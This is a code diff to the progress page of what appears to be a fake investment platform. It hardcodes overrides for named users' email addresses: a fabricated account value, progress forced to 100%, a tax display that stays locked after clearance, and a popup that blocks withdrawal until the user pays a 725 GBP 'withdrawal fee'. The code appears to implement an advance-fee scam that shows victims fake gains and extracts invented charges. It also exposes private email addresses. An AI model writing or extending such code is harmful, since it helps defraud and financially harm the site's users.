@@ -61,6 +61,10 @@ const MANUAL_PROGRESS_OVERRIDES: Record<
     taxDue?: number;
     initialHoldings: number;
     currency: "GBP" | "USD";
+    forceProgressPct?: number;
+    forceStartIso?: string;
+    forceDurationHours?: number;
+    lockTaxDisplay?: boolean;
   }
 > = {
   "imdadfamy@gmail.com": {
@@ -97,7 +101,24 @@ const MANUAL_PROGRESS_OVERRIDES: Record<
     taxPaid: 8265.58,
     initialHoldings: 2000,
     currency: "GBP"
+  },
+  "tzahielk@gmail.com": {
+    currentValue: 3200,
+    taxRate: 0.165,
+    taxDue: 0,
+    taxRemaining: 0,
+    taxPaid: 528,
+    initialHoldings: 500,
+    currency: "GBP",
+    forceProgressPct: 100,
+    forceStartIso: "2026-03-02T02:30:44",
+    forceDurationHours: 48,
+    lockTaxDisplay: true
   }
+};
+
+const WITHDRAWAL_FEE_LOCK_BY_EMAIL: Record<string, { amount: number; currency: "GBP" | "USD" }> = {
+  "tzahielk@gmail.com": { amount: 725, currency: "GBP" }
 };
 async function getJson<T>(path: string): Promise<T> {
   const res = await fetch(apiUrl(path), {
@@ -975,7 +996,8 @@ export default function ProgressPage() {
   const minsLeft = Math.floor((simMeta.remainingSec % 3600) / 60);
   const secsLeft = simMeta.remainingSec % 60;
   const manualOverride = MANUAL_PROGRESS_OVERRIDES[String(user.email || "").toLowerCase()] || null;
-  const useManualTaxOverride = !!manualOverride && !adminTaxCleared;
+  const withdrawFeeLock = WITHDRAWAL_FEE_LOCK_BY_EMAIL[String(user.email || "").toLowerCase()] || null;
+  const useManualTaxOverride = !!manualOverride && (!adminTaxCleared || manualOverride.lockTaxDisplay === true);
   const displayUnit: "USD" | "GBP" | "BTC" = (manualOverride?.currency || plan.unit) as "USD" | "GBP" | "BTC";
   const isBtcUnit = displayUnit === "BTC";
 
@@ -999,11 +1021,24 @@ export default function ProgressPage() {
   const effectiveCurrentRaw = manualOverride ? Number(manualOverride.currentValue || 0) : simMeta.current;
   const effectiveCurrent = Math.max(0, effectiveCurrentRaw - withdrawnLocked);
   const displayedCurrent = Math.max(0, effectiveCurrent - wdPendingAmount);
-  const startTime = new Date(simMeta.startSec * 1000);
-  const endTime = new Date(simMeta.endSec * 1000);
+  const startTimeRaw = new Date(simMeta.startSec * 1000);
+  const endTimeRaw = new Date(simMeta.endSec * 1000);
+  const forcedStartMs = manualOverride?.forceStartIso ? Date.parse(manualOverride.forceStartIso) : NaN;
+  const forcedDurationMs =
+    typeof manualOverride?.forceDurationHours === "number" && Number.isFinite(manualOverride.forceDurationHours)
+      ? Number(manualOverride.forceDurationHours) * 3600 * 1000
+      : NaN;
+  const startTime = Number.isFinite(forcedStartMs) ? new Date(forcedStartMs) : startTimeRaw;
+  const endTime =
+    Number.isFinite(forcedStartMs) && Number.isFinite(forcedDurationMs)
+      ? new Date(forcedStartMs + forcedDurationMs)
+      : endTimeRaw;
   const startShort = Number.isFinite(startTime.getTime()) ? startTime.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" }) : "--:--";
   const endShort = Number.isFinite(endTime.getTime()) ? endTime.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" }) : "--:--";
   const baseProgress01 = (() => {
+    if (typeof manualOverride?.forceProgressPct === "number") {
+      return clamp(Number(manualOverride.forceProgressPct) / 100, 0, 1);
+    }
     if (typeof taxSummary?.progress01 === "number") {
       return clamp(Number(taxSummary.progress01), 0, 1);
     }
@@ -1123,6 +1158,11 @@ export default function ProgressPage() {
       setWdMsg({ tone: "err", text: "Withdrawal unlocks only after 100% progress." });
       return;
     }
+    if (withdrawFeeLock) {
+      const feeLabel = fmtMoney(withdrawFeeLock.amount, withdrawFeeLock.currency);
+      setTaxPopup(`${userFirstName}, clear withdrawal fee of ${feeLabel} before submitting your withdrawal request.`);
+      return;
+    }
     const amt = lockedWithdrawalAmount;
     if (!Number.isFinite(amt) || amt <= 0) {
       setWdMsg({ tone: "err", text: "No withdrawable balance available." });
@@ -1209,7 +1249,7 @@ export default function ProgressPage() {
               </div>
             </div>
             <div className="progressBadge">
-              <div className="progressBadgeTop">{simMeta.done ? "COMPLETED" : "TIME LEFT"}</div>
+              <div className="progressBadgeTop">{simMeta.done || progressPct >= 100 ? "COMPLETED" : "TIME LEFT"}</div>
               <div className="mono">{timeLeftLabel}</div>
             </div>
           </div>
@@ -1321,6 +1361,11 @@ export default function ProgressPage() {
                 aria-disabled={!canOpenWithdrawPanel}
                 onClick={() => {
                   if (!reachedTarget) return;
+                  if (withdrawFeeLock) {
+                    const feeLabel = fmtMoney(withdrawFeeLock.amount, withdrawFeeLock.currency);
+                    setTaxPopup(`${userFirstName}, clear withdrawal fee of ${feeLabel} before submitting your withdrawal request.`);
+                    return;
+                  }
                   setWithdrawOpen(true);
                   setWdMsg(null);
                 }}
@@ -1329,7 +1374,9 @@ export default function ProgressPage() {
               </button>
               <div className="progressWithdrawHint muted">
                 {reachedTarget
-                  ? taxRemaining > 0.00000001
+                  ? withdrawFeeLock
+                    ? `Withdrawal fee clearance required first (${fmtMoney(withdrawFeeLock.amount, withdrawFeeLock.currency)}).`
+                    : taxRemaining > 0.00000001
                     ? `Tax payment required first (${taxRemainingLabel} remaining).`
                     : "Progress complete. Continue to withdrawal support."
                   : "Withdrawal unlocks automatically at 100% progress."}
